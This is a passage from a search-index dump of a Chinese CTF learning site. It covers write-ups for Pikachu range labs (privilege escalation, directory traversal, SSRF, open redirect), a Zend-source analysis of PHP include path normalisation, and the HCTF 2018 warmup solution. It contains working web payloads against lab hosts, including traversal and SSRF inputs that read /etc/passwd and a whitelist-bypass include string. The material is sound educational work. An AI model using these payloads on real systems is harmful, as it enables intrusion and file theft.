<p>\u4f46\u662f\u4e4b\u524d\u4f20\u7684\u9a6c\u5df2\u7ecf\u8003\u8651\u8fc7\u4e86\uff0c\u6240\u4ee5\u5185\u5bb9\u4e0d\u53d8</p>"},{"location":"web/Pikachu%E9%9D%B6%E5%9C%BA/#over-permission","title":"Over Permission","text":""},{"location":"web/Pikachu%E9%9D%B6%E5%9C%BA/#_3","title":"\u6c34\u5e73\u8d8a\u6743","text":"<p>\u767b\u9646\u4e0akobe\u7684\u8d26\u53f7\uff0c\u70b9\u51fb\u67e5\u770b\u4e2a\u4eba\u4fe1\u606f\uff0c\u53d1\u73b0\u7528\u7684\u662fget\u8bf7\u6c42</p> <pre><code>http://node.hackhub.get-shell.com:55190/vul/overpermission/op1/op1_mem.php?username=kobe&amp;submit=\u70b9\u51fb\u67e5\u770b\u4e2a\u4eba\u4fe1\u606f\n</code></pre> <p>\u8fd9\u4e2a\u65f6\u5019\u53ea\u8981\u628ausername\u6539\u6210\u5176\u4ed6\u7528\u6237\u5373\u53ef\u6c34\u5e73\u8d8a\u6743</p> <pre><code>http://node.hackhub.get-shell.com:55190/vul/overpermission/op1/op1_mem.php?username=lucy&amp;submit=\u70b9\u51fb\u67e5\u770b\u4e2a\u4eba\u4fe1\u606f\n</code></pre>"},{"location":"web/Pikachu%E9%9D%B6%E5%9C%BA/#_4","title":"\u5782\u76f4\u8d8a\u6743","text":"<p>\u63d0\u793a\u4e2d\u6709\uff1a<code>\u8fd9\u91cc\u6709\u4e24\u4e2a\u7528\u6237admin/123456,pikachu/000000,admin\u662f\u8d85\u7ea7boss</code></p> <p>\u6240\u4ee5\u6211\u4eec\u767b\u4e0aadmin\uff0c\u7136\u540e\u6b63\u5e38\u641e\u5230\u4e00\u4e2a\u8bf7\u6c42\uff0c\u4e4b\u540e\u518d\u62ff\u5230pikachu\u8d26\u53f7\u7684cookie\uff1a<code>5ff8a110e136bfab243a2fadb1521b84</code>\uff0c\u628acookie\u6539\u4e00\u4e0b\u8fdb\u884c\u53d1\u5305</p> <p></p> <p>\u53d1\u73b0\u4fee\u6539\u6210\u529f</p> <p></p>"},{"location":"web/Pikachu%E9%9D%B6%E5%9C%BA/#_5","title":"../../","text":""},{"location":"web/Pikachu%E9%9D%B6%E5%9C%BA/#_6","title":"\u76ee\u5f55\u904d\u5386","text":"<p>\u77e5\u5468\u6240\u4f17\uff0c<code>../</code>\u53ef\u4ee5\u9000\u51fa\u4e00\u5c42\u76ee\u5f55\uff0c\u6240\u4ee5\u9000\u51fa\u591a\u5c42\u5c31\u80fd\u8bbf\u95ee\u5230\u6839\u76ee\u5f55\uff0c\u4ece\u800c\u5b9e\u73b0\u76ee\u5f55\u904d\u5386</p> <pre><code>http://node.hackhub.get-shell.com:55190/vul/dir/dir_list.php?title=jarheads.php\nhttp://node.hackhub.get-shell.com:55190/vul/dir/dir_list.php?title=123\nhttp://node.hackhub.get-shell.com:55190/vul/dir/dir_list.php?title=../../../../../../../etc/passwd\n</code></pre>"},{"location":"web/Pikachu%E9%9D%B6%E5%9C%BA/#_7","title":"\u654f\u611f\u4fe1\u606f\u6cc4\u9732","text":""},{"location":"web/Pikachu%E9%9D%B6%E5%9C%BA/#icanseeyourabc","title":"icanseeyourABC","text":"<p>\u6e90\u4ee3\u7801\u91cc\u6ce8\u91ca\u6389\u4e86</p> <pre><code>&lt;!-- \u6d4b\u8bd5\u8d26\u53f7:lili/123456--&gt;\n</code></pre>"},{"location":"web/Pikachu%E9%9D%B6%E5%9C%BA/#php","title":"PHP\u53cd\u5e8f\u5217\u5316","text":"<p>\u53c2\u8003\u81eahttps://www.cnblogs.com/henry666/p/16947270.html</p> <pre><code>&lt;?php\nclass S{\n    var $test = \"&lt;script&gt;alert('Hacking')&lt;/script&gt;\";\n}\n\n$example = new S();\n$SerialString = serialize($example); \necho $SerialString; #\u8f93\u51fa: O:1:\"S\":1:{s:4:\"test\";s:33:\"&lt;script&gt;alert('Hacking')&lt;/script&gt;\";}\n\n?&gt;\n</code></pre> <p>\u57fa\u7840</p>"},{"location":"web/Pikachu%E9%9D%B6%E5%9C%BA/#xxe","title":"XXE","text":""},{"location":"web/Pikachu%E9%9D%B6%E5%9C%BA/#xxe_1","title":"XXE\u6f0f\u6d1e","text":"<p>https://www.cnblogs.com/backlion/p/9302528.html</p> <p>\u7528\u7684\u662f\u5728\u7ebf\u9776\u573a\uff0c\u6240\u4ee5\u6ca1\u6709\u81ea\u5df1\u5199flag\u5728\u6839\u76ee\u5f55\u5bfc\u81f4\u8bfb\u4e0d\u4e86\u6587\u4ef6</p>"},{"location":"web/Pikachu%E9%9D%B6%E5%9C%BA/#url","title":"URL\u91cd\u5b9a\u5411","text":""},{"location":"web/Pikachu%E9%9D%B6%E5%9C%BA/#url_1","title":"\u4e0d\u5b89\u5168\u7684URL\u8df3\u8f6c","text":"<pre><code>http://3caf3f99-a318-4504-9a53-16a03b792b38.node5.buuoj.cn:81/vul/urlredirect/urlredirect.php?url=unsafere.php\n</code></pre> <p>\u4fee\u6539url\u53c2\u6570\u5373\u53ef\u5b9e\u73b0\u8df3\u8f6c\u4f4d\u7f6e\u6539\u53d8</p>"},{"location":"web/Pikachu%E9%9D%B6%E5%9C%BA/#ssrf","title":"SSRF","text":""},{"location":"web/Pikachu%E9%9D%B6%E5%9C%BA/#ssrfcuri","title":"SSRF(curI)","text":"<p>curl\u652f\u6301file\u534f\u8bae</p> <pre><code>http://3caf3f99-a318-4504-9a53-16a03b792b38.node5.buuoj.cn:81/vul/ssrf/ssrf_curl.php?url=file:///etc/passwd\n</code></pre>"},{"location":"web/Pikachu%E9%9D%B6%E5%9C%BA/#ssrffile_get_content","title":"SSRF(file_get_content)","text":"<p>\u540ccurl</p> <pre><code>http://3caf3f99-a318-4504-9a53-16a03b792b38.node5.buuoj.cn:81/vul/ssrf/ssrf_fgc.php?file=file:///etc/passwd\n</code></pre> <p> by. HuajiHD </p>"},{"location":"web/%5BArticle%5D%20php_include_path_analysis/","title":"php include \u8def\u5f84\u89e3\u6790","text":"<p>PHP\u662f\u4e00\u79cd\u89e3\u91ca\u578b\u8bed\u8a00\uff0c\u5148\u901a\u8fc7\u7f16\u8bd1\u51fd\u6570 <code>zend_compile_file()</code> \u8fdb\u884c\u8bcd\u6cd5\u5206\u6790\u548c\u8bed\u6cd5\u5206\u6790\uff0c\u5f97\u5230\u6307\u4ee4\u7801\uff08opcode\uff09\uff0c\u7136\u540e\u4ea4\u7531 <code>Zend</code> \u865a\u62df\u673a\u8c03\u7528 <code>zend_execute()</code> \u6267\u884c\u6307\u4ee4\u3002</p> <p>\u5bf9\u4e8e\u4e0b\u9762\u7684php\u4ee3\u7801</p> <pre><code>&lt;?php\ninclude(\"source/../file.php\");\n?&gt;\n</code></pre> <p>zend\u5f15\u64ce\u4f1a\u9996\u5148\u5c06\u6e90\u7801\u8f6c\u4e3a\u4e2d\u95f4\u4ee3\u7801\u5982\u4e0b\uff0c\u8fd9\u4e00\u8f6c\u5316\u8fc7\u7a0b\u53ef\u901a\u8fc7 <code>vld</code> \u63d2\u4ef6\u5b9e\u73b0</p> <pre><code>line      #* E I O op                               fetch          ext  return  operands\n-----------------------------------------------------------------------------------------\n    4     0  E &gt;   EXT_STMT                                                     \n          1        INCLUDE_OR_EVAL                                              'source%2F..%2Ffile.php', INCLUDE\n    5     2      &gt; RETURN                                                       1\n</code></pre>"},{"location":"web/%5BArticle%5D%20php_include_path_analysis/#_1","title":"\u8c03\u7528\u6808\u5206\u6790","text":"<p><code>include</code> \u88ab\u8f6c\u5316\u4e3aopcode <code>ZEND_INCLUDE_OR_EVAL</code> \uff0c\u901a\u8fc7\u8ddf\u8e2aphp\u5185\u6838\u4ee3\u7801\uff08php8.x\uff09\uff0c\u53d1\u73b0\u8be5\u64cd\u4f5c\u7801\u7684\u5904\u7406\u51fd\u6570\u4e3a <code>ZEND_INCLUDE_OR_EVAL_SPEC_CONST_HANDLER()</code> (Zend/zend_vm_execute.h)\uff0c\u5176\u4e2d\u8c03\u7528 <code>zend_include_or_eval()</code> \u51fd\u6570\uff08Zend/zend_execute.c\uff09\uff0c\u6ce8\u610f\u5230\u4ee3\u7801\u4e2d\u901a\u8fc7\u4e00\u4e2a <code>switch</code> \u533a\u5206\u4e86 <code>include_once</code> \u3001 <code>require_once</code>\u3001<code>include</code>\u3001<code>require</code> \u548c <code>eval</code>\uff0c\u610f\u5473\u7740\u8fd9\u51e0\u4e2a\u51fd\u6570\u5176\u5b9e\u90fd\u4f1a\u8c03\u7528\u8fd9\u4e2a\u51fd\u6570</p> <pre><code>static zend_never_inline zend_op_array* ZEND_FASTCALL zend_include_or_eval(zval *inc_filename_zv, int type) \n{\n    zend_op_array *new_op_array = NULL;\n    zend_string *tmp_inc_filename;\n    zend_string *inc_filename = zval_try_get_tmp_string(inc_filename_zv, &amp;tmp_inc_filename);\n    if (UNEXPECTED(!inc_filename)) {\n        return NULL;\n    }\n\n    switch (type) {\n        case ZEND_INCLUDE_ONCE:\n        case ZEND_REQUIRE_ONCE: {\n                zend_file_handle file_handle;\n                zend_string *resolved_path;\n\n                resolved_path = zend_resolve_path(inc_filename);\n                if (EXPECTED(resolved_path)) {\n                    if (zend_hash_exists(&amp;EG(included_files), resolved_path)) {\n                        new_op_array = ZEND_FAKE_OP_ARRAY;\n                        zend_string_release_ex(resolved_path, 0);\n                        break;\n                    }\n                } else if (UNEXPECTED(EG(exception))) {\n                    break;\n                } else if (UNEXPECTED(zend_str_has_nul_byte(inc_filename))) {\n                    zend_message_dispatcher(\n                        (type == ZEND_INCLUDE_ONCE) ?\n                            ZMSG_FAILED_INCLUDE_FOPEN : ZMSG_FAILED_REQUIRE_FOPEN,\n                            ZSTR_VAL(inc_filename));\n                    break;\n                } else {\n                    resolved_path = zend_string_copy(inc_filename);\n                }\n\n                zend_stream_init_filename_ex(&amp;file_handle, resolved_path);\n                if (SUCCESS == zend_stream_open(&amp;file_handle)) {\n\n                    if (!file_handle.opened_path) {\n                        file_handle.opened_path = zend_string_copy(resolved_path);\n                    }\n\n                    if (zend_hash_add_empty_element(&amp;EG(included_files), file_handle.opened_path)) {\n                        new_op_array = zend_compile_file(&amp;file_handle, (type==ZEND_INCLUDE_ONCE?ZEND_INCLUDE:ZEND_REQUIRE));\n                    } else {\n                        new_op_array = ZEND_FAKE_OP_ARRAY;\n                    }\n                } else if (!EG(exception)) {\n                    zend_message_dispatcher(\n                        (type == ZEND_INCLUDE_ONCE) ?\n                            ZMSG_FAILED_INCLUDE_FOPEN : ZMSG_FAILED_REQUIRE_FOPEN,\n                            ZSTR_VAL(inc_filename));\n                }\n                zend_destroy_file_handle(&amp;file_handle);\n                zend_string_release_ex(resolved_path, 0);\n            }\n            break;\n        case ZEND_INCLUDE:\n        case ZEND_REQUIRE:\n            if (UNEXPECTED(zend_str_has_nul_byte(inc_filename))) {\n                zend_message_dispatcher(\n                    (type == ZEND_INCLUDE) ?\n                        ZMSG_FAILED_INCLUDE_FOPEN : ZMSG_FAILED_REQUIRE_FOPEN,\n                        ZSTR_VAL(inc_filename));\n                break;\n            }\n            new_op_array = compile_filename(type, inc_filename);\n            break;\n        case ZEND_EVAL: {\n                char *eval_desc = zend_make_compiled_string_description(\"eval()'d code\");\n                new_op_array = zend_compile_string(inc_filename, eval_desc, ZEND_COMPILE_POSITION_AFTER_OPEN_TAG);\n                efree(eval_desc);\n            }\n            break;\n        EMPTY_SWITCH_DEFAULT_CASE()\n    }\n\n    zend_tmp_string_release(tmp_inc_filename);\n    return new_op_array;\n}\n</code></pre> <p>\u91cd\u70b9\u5173\u6ce8 <code>ZEND_INCLUDE</code> \u90e8\u5206</p> <pre><code>if (UNEXPECTED(zend_str_has_nul_byte(inc_filename))) {\n    zend_message_dispatcher(\n        (type == ZEND_INCLUDE) ?\n        ZMSG_FAILED_INCLUDE_FOPEN : ZMSG_FAILED_REQUIRE_FOPEN,\n        ZSTR_VAL(inc_filename));\n    break;\n}\nnew_op_array = compile_filename(type, inc_filename);\n</code></pre> <p>\u524d\u9762\u7684if\u8bed\u53e5\u662f\u5b89\u5168\u68c0\u67e5\uff0c\u4e13\u95e8\u7528\u4e8e\u9632\u6b62\u8def\u5f84\u5b57\u7b26\u4e32\u4e2d\u5305\u542b NUL \u5b57\u8282 (<code>\\0</code>)\uff0c\u7136\u540e\u8c03\u7528 <code>compile_filename()</code> \uff08Zend/zend_language_scanner.l\uff09\uff0c\u539f\u578b\u5982\u4e0b</p> <pre><code>zend_op_array *compile_filename(int type, zend_string *filename)\n{\n    zend_file_handle file_handle;\n    zend_op_array *retval;\n    zend_string *opened_path = NULL; //\u4fdd\u5b58\u6587\u4ef6\u7684\u771f\u5b9e\u8def\u5f84\n\n    zend_stream_init_filename_ex(&amp;file_handle, filename);\n\n    retval = zend_compile_file(&amp;file_handle, type);\n    // \u5982\u679c\u7f16\u8bd1\u6210\u529f\u4e14\u6587\u4ef6\u53e5\u67c4\u6709\u6548\n    if (retval &amp;&amp; file_handle.handle.stream.handle) {\n        if (!file_handle.opened_path) {\n            file_handle.opened_path = opened_path = zend_string_copy(filename);\n        }\n\n        // \u628a\u8fd9\u4e2a\u6587\u4ef6\u52a0\u5165\u201c\u5df2\u5305\u542b\u6587\u4ef6\u201d\u5168\u5c40\u8868\n        zend_hash_add_empty_element(&amp;EG(included_files), file_handle.opened_path);\n\n        // \u91ca\u653e\u672c\u5730\u4e34\u65f6\u8def\u5f84\u5b57\u7b26\u4e32\uff0c\u9632\u6b62\u5185\u5b58\u6cc4\u6f0f\n        if (opened_path) {\n            zend_string_release_ex(opened_path, 0);\n        }\n    }\n    // \u9500\u6bc1\u6587\u4ef6\u53e5\u67c4\n    zend_destroy_file_handle(&amp;file_handle);\n\n    return retval;\n}\n</code></pre> <p>\u7136\u540e\u5728 <code>zend_compile_file()</code> \u4e2d\u5bf9\u6587\u4ef6\u53e5\u67c4\u4e2d\u7684\u6587\u4ef6\u8def\u5f84\u8fdb\u884c\u89e3\u6790\uff0c\u8c03\u7528\u6808\u5982\u4e0b</p> <pre><code>zend_compile_file()\n    | // \u8d4b\u503c\u53d1\u751f\u5728 Zend/zend.c\n    \u2514\u2500&gt; compile_file() // Zend/zend_language_scanner.l\n            \u2514\u2500&gt; open_file_for_scanning() // Zend/zend_language_scanner.l\n                    \u2514\u2500&gt; zend_stream_fixup() // Zend/zend_stream.c\n                            \u2514\u2500&gt; zend_stream_open() // Zend/zend_stream.c\n                                    \u2514\u2500&gt; zend_fopen() // Zend/zend.h\n                                            | // \u8d4b\u503c\u53d1\u751f\u5728 main/main.c\n                                            \u2514\u2500&gt; php_fopen_wrapper_for_zend() // main/main.c\n                                                    \u2514\u2500&gt; _php_stream_open_wrapper_as_file() // main/streams/php_stream_plain_wrapper.h\n                                                            \u2514\u2500&gt; _php_stream_open_wrapper_ex() // main/php_streams.h\n                                                                    \u2514\u2500&gt; php_resolve_path() // main/streams/fopen_wrappers.c\n</code></pre> <p>\u63a5\u7740\u5927\u6982\u5c31\u662f</p> <pre><code>php_resolve_path()\n    \u2193\ntsrm_realpath_str()\n    \u2193\ntsrm_realpath()\n    \u2193\nvirtual_file_ex() // Resolve path relatively to state and put the real path into state\n    \u2193\ntsrm_realpath_r()\n</code></pre> <p><code>tsrm_realpath_r()</code> \u51fd\u6570\u539f\u578b\u4e3a</p> <pre><code>static size_t tsrm_realpath_r(char *path, size_t start, size_t len, int *ll, time_t *t, int use_realpath, bool is_dir, int *link_is_dir)\n</code></pre> <p>\u8fd4\u56de\u503c\u4e3a\u8def\u5f84\u957f\u5ea6\uff0c\u5173\u952e\u4ee3\u7801\u5982\u4e0b</p> <pre><code>while (1) {\n        if (len &lt;= start) {\n            if (link_is_dir) {\n                *link_is_dir = 1;\n            }\n            return start;\n        }\n\n        i = len;\n        // \u79fb\u52a8 i \u5230\u8def\u5f84\u6700\u672b\u5c3e\u7684 '/' \u7684\u540e\u4e00\u4e2a\u5b57\u7b26\n        while (i &gt; start &amp;&amp; !IS_SLASH(path[i-1])) {\n            i--;\n        }\n        assert(i &lt; MAXPATHLEN);\n\n        if (i == len ||\n            (i + 1 == len &amp;&amp; path[i] == '.')) {\n            /* remove double slashes and '.' */\n            len = EXPECTED(i &gt; 0) ? i - 1 : 0;\n            is_dir = true;\n            continue;\n        } else if (i + 2 == len &amp;&amp; path[i] == '.' &amp;&amp; path[i+1] == '.') {\n            /* remove '..' and previous directory */\n            is_dir = true;\n            if (link_is_dir) {\n                *link_is_dir = 1;\n            }\n            if (i &lt;= start + 1) {\n                return start ? start : len;\n            }\n            j = tsrm_realpath_r(path, start, i-1, ll, t, use_realpath, true, NULL);\n            if (j &gt; start &amp;&amp; j != (size_t)-1) {\n                j--;\n                assert(i &lt; MAXPATHLEN);\n                while (j &gt; start &amp;&amp; !IS_SLASH(path[j])) {\n                    j--;\n                }\n                assert(i &lt; MAXPATHLEN);\n                if (!start) {\n                    /* leading '..' must not be removed in case of relative path */\n                    if (j == 0 &amp;&amp; path[0] == '.' &amp;&amp; path[1] == '.' &amp;&amp;\n                            IS_SLASH(path[2])) {\n                        path[3] = '.';\n                        path[4] = '.';\n                        path[5] = DEFAULT_SLASH;\n                        j = 5;\n                    } else if (j &gt; 0 &amp;&amp;\n                            path[j+1] == '.' &amp;&amp; path[j+2] == '.' &amp;&amp;\n                            IS_SLASH(path[j+3])) {\n                        j += 4;\n                        path[j++] = '.';\n                        path[j++] = '.';\n                        path[j] = DEFAULT_SLASH;\n                    }\n                }\n            } else if (!start &amp;&amp; !j) {\n                /* leading '..' must not be removed in case of relative path */\n                path[0] = '.';\n                path[1] = '.';\n                path[2] = DEFAULT_SLASH;\n                j = 2;\n            }\n            return j;\n        }\n\n        // \u5207\u5272path\uff0c\u9012\u5f52\u8c03\u7528 tsrm_realpath_r()\n        path[len] = 0;\n\n    ... // \u4ee5\u4e0b\u7701\u7565\n</code></pre>"},{"location":"web/%5BArticle%5D%20php_include_path_analysis/#_2","title":"\u89c4\u7ea6\u5316\u60c5\u51b5","text":""},{"location":"web/%5BArticle%5D%20php_include_path_analysis/#_3","title":"\u7b2c\u4e00\u79cd\u89c4\u7ea6","text":"<pre><code>if (i == len || (i + 1 == len &amp;&amp; path[i] == '.')) {\n    /* remove double slashes and '.' */\n    len = EXPECTED(i &gt; 0) ? i - 1 : 0;\n    is_dir = true;\n    continue;\n}\n</code></pre> <p>\u5220\u9664\u8def\u5f84\u672b\u5c3e\u7684 <code>/</code> \u6216 <code>/.</code> \uff08\u6216\u7279\u4f8b\u5168\u8def\u5f84 <code>.</code>\uff09\uff08\u524d\u90e8\u5206\u4ee3\u7801\u4fdd\u8bc1\u8fd9\u91cc\u4e0d\u4f1a\u51fa\u73b0\u7279\u4f8b\u5168\u8def\u5f84 <code>/</code>\uff09\uff0c\u5224\u65ad\u8be5\u8def\u5f84\u4e3a\u4e00\u4e2a\u76ee\u5f55\uff0c\u5e76\u8fdb\u5165\u4e0b\u4e00\u6b21\u5faa\u73af</p>"},{"location":"web/%5BArticle%5D%20php_include_path_analysis/#_4","title":"\u7b2c\u4e8c\u79cd\u89c4\u7ea6","text":"<pre><code>if (i + 2 == len &amp;&amp; path[i] == '.' &amp;&amp; path[i+1] == '.') {\n    /* remove '..' and previous directory */\n    is_dir = true;\n    if (link_is_dir) {\n        *link_is_dir = 1;\n    }\n    if (i &lt;= start + 1) {\n        return start ? start : len;\n    }\n    j = tsrm_realpath_r(path, start, i-1, ll, t, use_realpath, true, NULL);\n    if (j &gt; start &amp;&amp; j != (size_t)-1) {\n        j--;\n        ...\n    } else if (!start &amp;&amp; !j) {\n        ...\n    }\n    return j;\n}\n</code></pre>"},{"location":"web/%5BArticle%5D%20php_include_path_analysis/#_5","title":"\u53bb\u6389 <code>..</code>","text":"<p>\u5f53\u8def\u5f84\u4ee5 <code>/..</code> \u7ed3\u5c3e\u65f6\uff0c\u9012\u5f52\u8c03\u7528 <code>tsrm_realpath_r()</code> \uff0c\u4f20\u5165\u7684\u53c2\u6570 <code>i-1</code> \u8868\u793a\u8def\u5f84\u5b57\u7b26\u4e32\u957f\u5ea6\u51cf3\uff08\u6b64\u65f6 <code>i</code> \u6307\u5411\u4e2d\u95f4\u7684 <code>.</code> \uff0c\u5b57\u7b26\u4e32\u4e0b\u6807\u4ece0\u5f00\u59cb\uff09\uff0c\u5f97\u5230\u53bb\u6389\u672b\u5c3e <code>/..</code> \u540e\u7684\u89c4\u7ea6\u5b57\u7b26\u4e32\u7684\u957f\u5ea6</p> <p>\u4f8b\u5982\u5bf9\u4e8e\u8def\u5f84 <code>/usr/local/..</code> \uff0c<code>j = len(\"/usr/local\")</code> </p>"},{"location":"web/%5BArticle%5D%20php_include_path_analysis/#_6","title":"\u53bb\u6389\u4e0a\u7ea7\u76ee\u5f55","text":"<p>\u5982\u679c <code>j</code> \u6ca1\u6709\u5230\u8fbe\u5f00\u5934\uff0c\u4e5f\u6ca1\u6709\u51fa\u9519</p> <pre><code>if (j &gt; start &amp;&amp; j != (size_t)-1)\n</code></pre> <p><code>j--</code> \u540e\u6307\u5411\u8def\u5f84\u4e32\u6700\u540e\u4e00\u4e2a\u5b57\u7b26\uff0c\u7136\u540e\u518d\u901a\u8fc7\u524d\u9762\u7c7b\u4f3c\u7684 <code>while</code> \u5faa\u73af\u518d\u627e\u5230\u6700\u672b\u5c3e\u7684 <code>/</code> \u7684\u4f4d\u7f6e\uff08\u6ce8\u610f\u8fd9\u91cc\u4e0d\u662f <code>/</code> \u7684\u540e\u4e00\u4e2a\u4f4d\u7f6e\uff09\u6216\u5f00\u5934\u4f4d\u7f6e</p> <pre><code>j--;\nassert(i &lt; MAXPATHLEN);\nwhile (j &gt; start &amp;&amp; !IS_SLASH(path[j])) {\n    j--;\n}\nassert(i &lt; MAXPATHLEN);\n</code></pre> <p>\u7136\u540e\u5982\u679c\u6574\u4e2a\u8def\u5f84\u4e3a\u76f8\u5bf9\u8def\u5f84\uff08\u5373 <code>start==0</code> \uff0c\u8868\u793a\u8def\u5f84\u5f00\u5934\u6ca1\u6709 <code>/</code> \uff0c\u5982\u679c\u662f\u7edd\u5bf9\u8def\u5f84\uff0c<code>tsrm_realpath_r()</code> \u4f20\u5165\u7684start\u4e3a1\uff09\uff0c\u4fdd\u7559 <code>../../</code> \u548c <code>usr/../../</code> \u7684\u60c5\u51b5\uff08 <code>usr</code> \u8868\u793a\u4e00\u822c\u76ee\u5f55\uff09</p> <pre><code>if (!start) {\n    /* leading '..' must not be removed in case of relative path */\n    if (j == 0 &amp;&amp; path[0] == '.' &amp;&amp; path[1] == '.' &amp;&amp;\n        IS_SLASH(path[2])) {\n        path[3] = '.';\n        path[4] = '.';\n        path[5] = DEFAULT_SLASH;\n        j = 5;\n    } else if (j &gt; 0 &amp;&amp;\n               path[j+1] == '.' &amp;&amp; path[j+2] == '.' &amp;&amp;\n               IS_SLASH(path[j+3])) {\n        j += 4;\n        path[j++] = '.';\n        path[j++] = '.';\n        path[j] = DEFAULT_SLASH;\n    }\n}\n</code></pre> <p>\u82e5 <code>j</code> \u5230\u8fbe\u4e86\u5f00\u5934\u4e14\u6ca1\u6709\u51fa\u9519\uff0c\u5e76\u4e14\u662f\u76f8\u5bf9\u8def\u5f84\uff0c\u5219\u4fdd\u7559 <code>..</code> \u7684\u60c5\u51b5</p> <pre><code>if (!start &amp;&amp; !j) {\n    /* leading '..' must not be removed in case of relative path */\n    path[0] = '.';\n    path[1] = '.';\n    path[2] = DEFAULT_SLASH;\n    j = 2;\n}\n</code></pre> <p>\u6700\u540e\u8fd4\u56de <code>j</code> \u4f5c\u4e3a\u5916\u5c42 <code>tsrm_realpath_r()</code> \u7684\u8fd4\u56de\u503c\uff0c\u8868\u793a\u8f93\u5165\u8def\u5f84\u4e32\u89c4\u7ea6\u5316\u540e\u7684\u957f\u5ea6</p> <p> by. Spark0618 </p>"},{"location":"web/%5BHCTF%202018%5D%20warmup/","title":"[HCTF 2018] warmup","text":"<p>\u9996\u5148\u6839\u636e\u9875\u9762\u6e90\u7801\u63d0\u793a\u627e\u5230 <code>source.php</code></p> <p></p> <p>\u8bbf\u95ee\u540e\u663e\u793a\u9875\u9762\u6e90\u7801\u5982\u4e0b</p> <pre><code>&lt;?php\n    highlight_file(__FILE__);\n    class emmm\n    {\n        public static function checkFile(&amp;$page)\n        {\n            $whitelist = [\"source\"=&gt;\"source.php\",\"hint\"=&gt;\"hint.php\"];\n            if (! isset($page) || !is_string($page)) {\n                echo \"you can't see it\";\n                return false;\n            }\n\n            if (in_array($page, $whitelist)) {\n                return true;\n            }\n\n            $_page = mb_substr(\n                $page,\n                0,\n                mb_strpos($page . '?', '?')\n            );\n            if (in_array($_page, $whitelist)) {\n                return true;\n            }\n\n            $_page = urldecode($page);\n            $_page = mb_substr(\n                $_page,\n                0,\n                mb_strpos($_page . '?', '?')\n            );\n            if (in_array($_page, $whitelist)) {\n                return true;\n            }\n            echo \"you can't see it\";\n            return false;\n        }\n    }\n\n    if (! empty($_REQUEST['file'])\n        &amp;&amp; is_string($_REQUEST['file'])\n        &amp;&amp; emmm::checkFile($_REQUEST['file'])\n    ) {\n        include $_REQUEST['file'];\n        exit;\n    } else {\n        echo \"&lt;br&gt;&lt;img src=\\\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\\" /&gt;\";\n    }  \n?&gt;\n</code></pre> <p><code>$_REQUEST['file']</code> \u9ed8\u8ba4\u5305\u542b\u4e86 <code>$_GET</code>\u3001<code>$_POST</code> \u548c <code>$_COOKIE</code> \u7684\u5185\u5bb9</p> <p>\u6700\u540e\u662f\u8981\u7ed5\u8fc7\u8fc7\u6ee4\u6267\u884c <code>include $_REQUEST['file'];</code></p> <p>\u6e90\u7801\u4f7f\u7528\u4e86\u767d\u540d\u5355\u8fc7\u6ee4</p> <pre><code>&lt;?php\n$whitelist = [\"source\"=&gt;\"source.php\",\"hint\"=&gt;\"hint.php\"];\nif (! isset($page) || !is_string($page)) {\n    echo \"you can't see it\";\n    return false;\n}\n\nif (in_array($page, $whitelist)) {\n    return true;\n}\n</code></pre> <p>\u770b\u5230\u6709 <code>hint.php</code>\uff0c\u8bbf\u95ee\u5f97\u5230hint\uff0c\u731c\u6d4bflag\u6587\u4ef6\u540d\u4e3a <code>ffffllllaaaagggg</code></p> <pre><code>flag not here, and flag in ffffllllaaaagggg\n</code></pre> <p>\u6574\u4e2a\u8fc7\u6ee4\u8981\u6c42\u4f20\u53c2\u4e3a\u5b57\u7b26\u4e32\uff08\u5b58\u50a8\u5728 <code>$page</code> \u4e2d\uff09\uff0c\u6ee1\u8db3\u4ee5\u4e0b\u4efb\u610f\u6761\u4ef6\u5373\u53ef\u901a\u8fc7\uff1a</p> <ol> <li> <p><code>$page == \"source.php\"</code> \u6216 <code>\"hint.php\"</code></p> </li> <li> <p><code>$page</code> \u4ee5 <code>source.php?</code> \u6216 <code>hint.php?</code> \u5f00\u5934</p> </li> <li> <p><code>urldecode($page)</code> \u4ee5 <code>source.php?</code> \u6216 <code>hint.php?</code> \u5f00\u5934</p> </li> </ol> <p>\u56e0\u6b64 <code>payload</code> \u5982\u4e0b\uff08\u5de5\u4f5c\u76ee\u5f55\u4e0b\u6ca1\u627e\u5230\uff0c\u4f9d\u6b21\u5f80\u4e0a\u7ea7\u76ee\u5f55\u67e5\u627e\uff0c\u6700\u7ec8\u5728\u6839\u76ee\u5f55\u4e0b\u627e\u5230\uff09</p> Note <p>\u4e3a\u4ec0\u4e48 <code>../../../</code> \u62b5\u8fbe\u7684\u662f\u6839\u76ee\u5f55\uff1f</p> <p>\u56e0\u4e3aweb\u670d\u52a1\u7684\u5de5\u4f5c\u76ee\u5f55\u4e00\u822c\u4f4d\u4e8e/var/www/html/</p> <pre><code>file=source.php?/../../../../ffffllllaaaagggg\n</code></pre> <p>\u5176\u4e2d <code>include</code> \u5728linux\u4e0b\u4f1a\u5c06 <code>source.php?</code> \u89c6\u4e3a\u4e00\u4e2a\u76ee\u5f55\uff08\u56e0\u4e3alinux\u4e0b\u76ee\u5f55\u547d\u540d\u53ef\u542b <code>'?'</code>\uff0c\u4f46windows\u4e0b\u4e0d\u884c\uff0c\u6240\u4ee5\u65e0\u6cd5\u5728windows\u4e0b\u590d\u73b0\uff0c\u56e0\u4e3a <code>include</code> \u5e95\u5c42\u8c03\u7528\u7684\u662f\u64cd\u4f5c\u7cfb\u7edfapi\u6765\u68c0\u67e5\u6587\u4ef6\u5b58\u5728\u6027\u7684\uff09\uff0c<code>source.php?/../</code> \u7b49\u6548\u4e8e <code>./</code> </p> <p>\u6ce8\u610f\uff0c\u8fd9\u662f <code>include</code> \u7684\u8def\u5f84\u89c4\u7ea6\uff08clear/normalize\uff09\u7279\u6027\uff0c\u8be6\u89c1 include\u8def\u5f84\u89e3\u6790\uff0c\u800c\u4f60\u5982\u679c\u5728shell\u4e2d\u8bbf\u95ee <code>source.php?/../</code> \u8fd9\u6837\u4e00\u6bb5\u8def\u5f84\uff0c\u64cd\u4f5c\u7cfb\u7edf\u4f1a\u5148\u68c0\u67e5 <code>source.php?</code> \u76ee\u5f55\u662f\u5426\u5b58\u5728\uff0c\u82e5\u4e0d\u5b58\u5728\u4f1a\u76f4\u63a5\u62a5\u9519</p> <p> by. Spark0618 </p>"},{"location":"web/%5B%E6%B1%9F%E8%8B%8F%E5%B7%A5%E5%8C%A0%E6%9D%AF%5D%20unseping/","title":"[\u6c5f\u82cf\u5de5\u5320\u676f] unseping","text":"<p><code>waf()</code> \u51fd\u6570\u8fc7\u6ee4\u4e86 